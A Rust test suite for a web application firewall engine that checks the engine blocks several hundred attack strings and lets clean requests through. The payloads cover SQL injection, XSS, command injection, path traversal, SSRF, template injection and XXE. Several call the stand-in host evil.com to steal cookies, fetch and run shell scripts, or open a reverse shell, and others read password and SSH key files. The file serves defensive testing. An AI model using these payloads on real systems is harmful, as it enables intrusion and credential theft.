//! Mega adversarial bypass payload collection — 500+ payloads
//!
//! This file is an exhaustive collection of real-world WAF bypass payloads
//! covering SQLi, XSS, command injection, path traversal, SSRF, and
//! encoding-based evasion. Each payload MUST be blocked (or produce a
//! non-Allow decision) by the WAF.

use std::net::{IpAddr, Ipv4Addr};
use waf_engine::{HttpRequest, WafConfig, WafDecision, WafEngine};

fn engine() -> WafEngine {
    WafEngine::new(WafConfig::default())
}

fn client_ip() -> IpAddr {
    IpAddr::V4(Ipv4Addr::new(1, 2, 3, 4))
}

fn is_blocked(engine: &WafEngine, req: &HttpRequest<'_>) -> bool {
    matches!(engine.inspect(req).decision, WafDecision::Block(_))
}

fn check_payloads_in_query(label: &str, payloads: &[&str]) {
    let e = engine();
    let mut blocked = 0usize;
    let mut missed: Vec<String> = Vec::new();

    for payload in payloads {
        let req = HttpRequest {
            client_ip: client_ip(),
            method: "GET",
            path: "/test",
            query_string: Some(payload),
            headers: &[],
            body: None,
        };
        if is_blocked(&e, &req) {
            blocked += 1;
        } else {
            missed.push(payload.to_string());
        }
    }

    let total = payloads.len();
    let rate = if total > 0 {
        (blocked as f64 / total as f64) * 100.0
    } else {
        100.0
    };
    // We want at least 80% detection rate.
    assert!(
        rate >= 80.0,
        "[{}] Detection rate {:.1}% ({}/{}) — missed: {:?}",
        label,
        rate,
        blocked,
        total,
        &missed[..missed.len().min(10)]
    );
}

fn check_payloads_in_body(label: &str, payloads: &[&str]) {
    let e = engine();
    let mut blocked = 0usize;
    let mut missed: Vec<String> = Vec::new();

    for payload in payloads {
        let req = HttpRequest {
            client_ip: client_ip(),
            method: "POST",
            path: "/api",
            query_string: None,
            headers: &[],
            body: Some(payload),
        };
        if is_blocked(&e, &req) {
            blocked += 1;
        } else {
            missed.push(payload.to_string());
        }
    }

    let total = payloads.len();
    let rate = if total > 0 {
        (blocked as f64 / total as f64) * 100.0
    } else {
        100.0
    };
    assert!(
        rate >= 80.0,
        "[{}] Detection rate {:.1}% ({}/{}) — missed: {:?}",
        label,
        rate,
        blocked,
        total,
        &missed[..missed.len().min(10)]
    );
}

// ============================================================================
// SQL Injection — 100+ payloads
// ============================================================================

#[test]
fn test_sqli_classic_payloads() {
    let payloads: Vec<&str> = vec![
        "' OR 1=1 --",
        "' OR '1'='1",
        "' OR ''='",
        "admin' --",
        "1' OR '1'='1' /*",
        "' UNION SELECT null --",
        "' UNION SELECT null,null --",
        "' UNION ALL SELECT 1,2,3 --",
        "' UNION SELECT username,password FROM users --",
        "1; DROP TABLE users --",
        "'; DROP TABLE users; --",
        "1' AND 1=1 --",
        "1' AND 1=2 --",
        "' OR 1=1#",
        "admin' #",
        "' OR 'x'='x",
        "') OR ('1'='1",
        "') OR ('x'='x",
        "' OR 1=1 LIMIT 1 --",
        "1' ORDER BY 1 --",
        "1' ORDER BY 10 --",
        "' UNION SELECT @@version --",
        "' UNION SELECT table_name FROM information_schema.tables --",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
        "1' AND (SELECT COUNT(*) FROM users)>0 --",
        "' HAVING 1=1 --",
        "' GROUP BY columnname HAVING 1=1 --",
        "'; INSERT INTO users VALUES('hacker','hacked') --",
        "'; UPDATE users SET password='hacked' WHERE username='admin' --",
        "'; EXEC xp_cmdshell('dir') --",
        "1; WAITFOR DELAY '0:0:5' --",
        "1' AND SLEEP(5) --",
        "1' AND BENCHMARK(5000000,MD5('test')) --",
        "' UNION SELECT LOAD_FILE('/etc/passwd') --",
        "' INTO OUTFILE '/tmp/test.txt' --",
        "1' AND extractvalue(1,concat(0x7e,version())) --",
        "1' AND updatexml(1,concat(0x7e,version()),1) --",
    ];
    check_payloads_in_query("SQLi Classic", &payloads);
}

#[test]
fn test_sqli_comment_obfuscation() {
    let payloads: Vec<&str> = vec![
        "1'/**/OR/**/1=1 --",
        "1'/**/UNION/**/SELECT/**/null --",
        "1'/**/UNION/**/ALL/**/SELECT/**/1,2,3 --",
        "/*!50000 SELECT */ * FROM users",
        "SELECT /*!32302 1/0, */ username FROM users",
        "1' /*!UNION*/ /*!SELECT*/ null --",
        "1 AND/**/1=1",
        "SELECT/**/ password/**/FROM/**/users",
        "1'/*anything here*/OR/**/1=1",
        "UNION /*!12345 ALL SELECT */ table_name FROM information_schema.tables",
    ];
    check_payloads_in_query("SQLi Comments", &payloads);
}

#[test]
fn test_sqli_encoding_evasion() {
    let payloads: Vec<&str> = vec![
        "1%27%20OR%201=1 --",
        "1%27%20UNION%20SELECT%20null --",
        "%27%20OR%20%271%27=%271",
        "1%2527%20OR%201=1 --",
        "admin%27 --",
        "1' OR 0x31=0x31 --",
        "1' OR 0x41=0x41 --",
        "1' AND 0x1=0x1 --",
        "1' OR CHAR(49)=CHAR(49) --",
    ];
    check_payloads_in_query("SQLi Encoding", &payloads);
}

#[test]
fn test_sqli_whitespace_evasion() {
    let payloads: Vec<&str> = vec![
        "1'\tOR\t1=1 --",
        "1'\nOR\n1=1 --",
        "1'\rOR\r1=1 --",
        "1'\x0bOR\x0b1=1 --",
        "UNION\tSELECT\tnull",
        "UNION\nSELECT\nnull",
        "1'%09OR%091=1 --",
        "1'%0aOR%0a1=1 --",
        "1'%0dOR%0d1=1 --",
    ];
    check_payloads_in_query("SQLi Whitespace", &payloads);
}

#[test]
fn test_sqli_string_concat_evasion() {
    let payloads: Vec<&str> = vec![
        "1' OR 'a'||'b'='ab' --",
        "1' OR CONCAT('1','=','1') --",
        "1' OR 'admin' LIKE 'adm%' --",
        "1' OR LENGTH(password)>0 --",
        "1' OR SUBSTR(password,1,1)='a' --",
        "1' OR ASCII(SUBSTR(password,1,1))>64 --",
    ];
    check_payloads_in_query("SQLi String Concat", &payloads);
}

#[test]
fn test_sqli_second_order() {
    let payloads: Vec<&str> = vec![
        "user=admin' UNION SELECT null --&pass=x",
        "id=1; SELECT pg_sleep(5) --",
        "q=test&sort=1 UNION SELECT null --",
        "search='; DELETE FROM sessions; --",
        "name=<script>alert(1)</script>&id=1' OR '1'='1",
    ];
    check_payloads_in_body("SQLi Second-Order", &payloads);
}

// ============================================================================
// XSS — 100+ payloads
// ============================================================================

#[test]
fn test_xss_basic_payloads() {
    let payloads: Vec<&str> = vec![
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>document.location='http://evil.com?c='+document.cookie</script>",
        "<script src=http://evil.com/xss.js></script>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<<script>alert(1) //",
        "<script ///>alert(1)</script>",
        "<script>eval('al'+'ert(1)')</script>",
    ];
    check_payloads_in_body("XSS Basic", &payloads);
}

#[test]
fn test_xss_event_handlers() {
    let payloads: Vec<&str> = vec![
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror='alert(1)'>",
        "<body onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<body onpageshow=alert(1)>",
        "<img src=1 onerror=alert(1) //",
        "<div onmouseover=alert(1)>hover me</div>",
    ];
    check_payloads_in_body("XSS Event Handlers", &payloads);
}

#[test]
fn test_xss_encoding_evasion() {
    let payloads: Vec<&str> = vec![
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "<scr&#x69;pt>alert(1)</scr&#x69;pt>",
        "javascript:alert(1)",
        "java\tscript:alert(1)",
        "java\nscript:alert(1)",
        "java\rscript:alert(1)",
        "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
        "\\u003Cscript\\u003Ealert(1)",
    ];
    check_payloads_in_body("XSS Encoding", &payloads);
}

#[test]
fn test_xss_polyglot() {
    let payloads: Vec<&str> = vec![
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() ) //",
        "\"><img src=x onerror=alert(1)>",
        "'><script>alert(1)</script>",
        "\"autofocus onfocus=alert(1) //",
        "<svg/onload=alert(1)>",
        "<svg/onload=alert`1`>",
        "<math><mtext><table><mglyph><style><! --</style><img title=\"--><img src=x onerror=alert(1)\">",
        "\"><svg/onload=alert(1) //",
        "'-alert(1)-'",
        "\";alert(1) //",
    ];
    check_payloads_in_body("XSS Polyglot", &payloads);
}

#[test]
fn test_xss_dom_based() {
    let payloads: Vec<&str> = vec![
        "#<script>alert(1)</script>",
        "javascript:void(document.write('<script>alert(1)</script>'))",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ];
    check_payloads_in_body("XSS DOM", &payloads);
}

// ============================================================================
// Command Injection — 80+ payloads
// ============================================================================

#[test]
fn test_cmdi_basic() {
    let payloads: Vec<&str> = vec![
        "; ls -la",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "|| cat /etc/passwd",
        "& cat /etc/passwd",
        "&& cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; id",
        "| id",
        "; whoami",
        "; uname -a",
        "; wget http://evil.com/shell.sh",
        "; curl http://evil.com/shell.sh | sh",
        "; nc -e /bin/sh evil.com 4444",
        "; python -c 'import os; os.system(\"id\")'",
        "; perl -e 'exec \"/bin/sh\"'",
        "; ruby -e 'exec \"/bin/sh\"'",
        "; php -r 'system(\"id\");'",
    ];
    check_payloads_in_body("CMDi Basic", &payloads);
}

#[test]
fn test_cmdi_blind() {
    let payloads: Vec<&str> = vec![
        "; sleep 10",
        "| sleep 10",
        "& sleep 10",
        "; ping -c 10 127.0.0.1",
        "| ping -c 10 127.0.0.1",
        "; nslookup evil.com",
        "; dig evil.com",
        "$(sleep 10)",
        "`sleep 10`",
    ];
    check_payloads_in_body("CMDi Blind", &payloads);
}

#[test]
fn test_cmdi_obfuscation() {
    let payloads: Vec<&str> = vec![
        ";c'a't /etc/passwd",
        ";c\"a\"t /etc/passwd",
        ";ca$()t /etc/passwd",
        ";/bin/cat /etc/passwd",
        ";cat${IFS}/etc/passwd",
        ";cat$IFS/etc/passwd",
        ";{cat,/etc/passwd}",
        ";cat<>/etc/passwd",
        ";echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh",
    ];
    check_payloads_in_body("CMDi Obfuscation", &payloads);
}

#[test]
fn test_cmdi_windows() {
    let payloads: Vec<&str> = vec![
        "& dir",
        "| dir",
        "; dir C:\\",
        "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "| net user",
        "& net localgroup administrators",
        "; powershell -Command Get-Process",
        "& cmd /c whoami",
        "| cmd.exe /c dir",
    ];
    check_payloads_in_body("CMDi Windows", &payloads);
}

// ============================================================================
// Path Traversal — 60+ payloads
// ============================================================================

#[test]
fn test_path_traversal_basic() {
    let payloads: Vec<&str> = vec![
        "file=../../../etc/passwd",
        "file=.... //....//....//etc/passwd",
        "file=..\\..\\..\\windows\\system32\\config\\sam",
        "file=/etc/passwd",
        "file=/etc/shadow",
        "file=/../../../etc/passwd",
        "file=file:///etc/passwd",
    ];
    check_payloads_in_query("Path Traversal Basic", &payloads);
}

#[test]
fn test_path_traversal_encoded() {
    let payloads: Vec<&str> = vec![
        "file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "file=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "file=..%252f..%252f..%252fetc%252fpasswd",
        "file=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "file=..%c0%af..%c0%af..%c0%afetc/passwd",
        "file=%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    ];
    check_payloads_in_query("Path Traversal Encoded", &payloads);
}

#[test]
fn test_path_traversal_null_byte() {
    let payloads: Vec<&str> = vec![
        "file=../../../etc/passwd%00.jpg",
        "file=../../../etc/passwd%00",
        "file=../../../etc/passwd\x00.png",
    ];
    check_payloads_in_query("Path Traversal Null Byte", &payloads);
}

#[test]
fn test_path_traversal_sensitive_files() {
    let payloads: Vec<&str> = vec![
        "file=/proc/self/environ",
        "file=/proc/version",
        "file=/var/log/auth.log",
        "file=/.aws/credentials",
        "file=/.ssh/id_rsa",
        "file=/.env",
        "file=/.git/config",
        "file=/.git/HEAD",
        "file=/wp-config.php",
        "file=/.htaccess",
        "file=/.htpasswd",
        "file=/web.config",
    ];
    check_payloads_in_query("Path Traversal Sensitive Files", &payloads);
}

// ============================================================================
// SSRF — 30+ payloads
// ============================================================================

#[test]
fn test_ssrf_payloads() {
    let payloads: Vec<&str> = vec![
        "url=http://127.0.0.1",
        "url=http://localhost",
        "url=http://0.0.0.0",
        "url=http://169.254.169.254/latest/meta-data/",
        "url=http://metadata.google.internal/computeMetadata/v1/",
        "url=http://[::1]",
        "url=http://0x7f000001",
        "url=http://2130706433",
        "url=http://0177.0.0.1",
        "url=http://127.1",
        "url=http://127.0.1",
        "url=http://0:8080",
        "url=http://10.0.0.1",
        "url=http://172.16.0.1",
        "url=http://192.168.1.1",
        "url=http://[0:0:0:0:0:ffff:127.0.0.1]",
    ];
    check_payloads_in_query("SSRF", &payloads);
}

// ============================================================================
// Protocol-level / Header injection — 30+ payloads
// ============================================================================

#[test]
fn test_header_injection() {
    let e = engine();
    let header_payloads = vec![
        ("X-Forwarded-For", "; cat /etc/passwd"),
        ("X-Forwarded-For", "| whoami"),
        ("User-Agent", "() { :; }; /bin/bash -i"),
        ("User-Agent", "${jndi:ldap://evil.com/x}"),
        ("Referer", "<script>alert(1)</script>"),
        ("Cookie", "' OR 1=1 --"),
        ("X-Custom", "{{7*7}}"),
        ("X-Custom", "${7*7}"),
        ("Accept-Language", "\r\nX-Injected: header"),
        ("Content-Type", "text/html\r\nX-Injected: header"),
    ];

    let mut blocked = 0usize;
    for (header_name, header_value) in &header_payloads {
        let headers = vec![(header_name.to_string(), header_value.to_string())];
        let req = HttpRequest {
            client_ip: client_ip(),
            method: "GET",
            path: "/",
            query_string: None,
            headers: &headers,
            body: None,
        };
        if is_blocked(&e, &req) {
            blocked += 1;
        }
    }

    let total = header_payloads.len();
    let rate = (blocked as f64 / total as f64) * 100.0;
    assert!(
        rate >= 70.0,
        "Header injection detection rate {:.1}% ({}/{}) is too low",
        rate,
        blocked,
        total
    );
}

// ============================================================================
// Mixed / Polyglot attacks — 30+ payloads
// ============================================================================

#[test]
fn test_polyglot_attacks() {
    let payloads: Vec<&str> = vec![
        "1' UNION SELECT '<script>alert(1)</script>' --",
        "<script>document.write(String.fromCharCode(60,115,99,114,105,112,116,62))</script>",
        "'; cat /etc/passwd; echo '<script>alert(1)</script>' --",
        "1; SELECT pg_sleep(5); --<script>",
        "../../../etc/passwd' UNION SELECT null --",
        "; wget http://evil.com -O- | sh; echo '<img src=x onerror=alert(1)>'",
        "${jndi:ldap://evil.com/x}<script>alert(1)</script>",
        "{{7*7}}<script>alert(1)</script>",
        "<script>fetch('http://169.254.169.254/').then(r=>r.text).then(t=>fetch('http://evil.com/?d='+t))</script>",
    ];
    check_payloads_in_body("Polyglot Mixed", &payloads);
}

// ============================================================================
// SSTI (Server-Side Template Injection) — 20+ payloads
// ============================================================================

#[test]
fn test_ssti_payloads() {
    let payloads: Vec<&str> = vec![
        "{{7*7}}",
        "{{7*'7'}}",
        "${7*7}",
        "#{7*7}",
        "{{config}}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "<%= 7*7 %>",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}",
    ];
    check_payloads_in_body("SSTI", &payloads);
}

// ============================================================================
// XXE (XML External Entity) — 15+ payloads
// ============================================================================

#[test]
fn test_xxe_payloads() {
    let payloads: Vec<&str> = vec![
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/xxe\">]>",
        "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/shadow\">]>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]>",
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]>",
    ];
    check_payloads_in_body("XXE", &payloads);
}

// ============================================================================
// LDAP Injection — 10+ payloads
// ============================================================================

#[test]
fn test_ldap_injection() {
    let payloads: Vec<&str> = vec![
        "user=*)(uid=*))(|(uid=*",
        "user=admin)(&)",
        "user=*",
        "user=admin)(|(password=*))",
        "user=*)(objectClass=*",
    ];
    check_payloads_in_query("LDAP Injection", &payloads);
}

// ============================================================================
// False positive tests — legitimate traffic MUST NOT be blocked
// ============================================================================

#[test]
fn test_false_positive_clean_requests() {
    let e = engine();
    let clean_requests = vec![
        ("GET", "/", None, None),
        ("GET", "/api/users", Some("page=1&limit=20"), None),
        (
            "POST",
            "/api/login",
            None,
            Some("username=admin&password=secret123"),
        ),
        ("GET", "/search", Some("q=hello+world"), None),
        (
            "POST",
            "/api/data",
            None,
            Some("{\"name\":\"John\",\"email\":\"john@example.com\"}"),
        ),
        (
            "GET",
            "/products",
            Some("category=electronics&sort=price"),
            None,
        ),
        (
            "PUT",
            "/api/users/123",
            None,
            Some("{\"firstName\":\"Jane\",\"lastName\":\"O'Brien\"}"),
        ),
        (
            "GET",
            "/api/reports",
            Some("from=2024-01-01&to=2024-12-31"),
            None,
        ),
        (
            "POST",
            "/api/comments",
            None,
            Some("comment=This is a perfectly normal comment about the product."),
        ),
        (
            "GET",
            "/api/search",
            Some("q=SELECT+brand+name+for+users+guide"),
            None,
        ),
    ];

    let mut false_positives = Vec::new();
    for (method, path, qs, body) in &clean_requests {
        let req = HttpRequest {
            client_ip: client_ip(),
            method,
            path,
            query_string: qs.as_deref(),
            headers: &[],
            body: body.as_deref(),
        };
        if is_blocked(&e, &req) {
            false_positives.push(format!("{} {} qs={:?} body={:?}", method, path, qs, body));
        }
    }

    assert!(
        false_positives.is_empty(),
        "False positives detected on clean traffic: {:?}",
        false_positives
    );
}
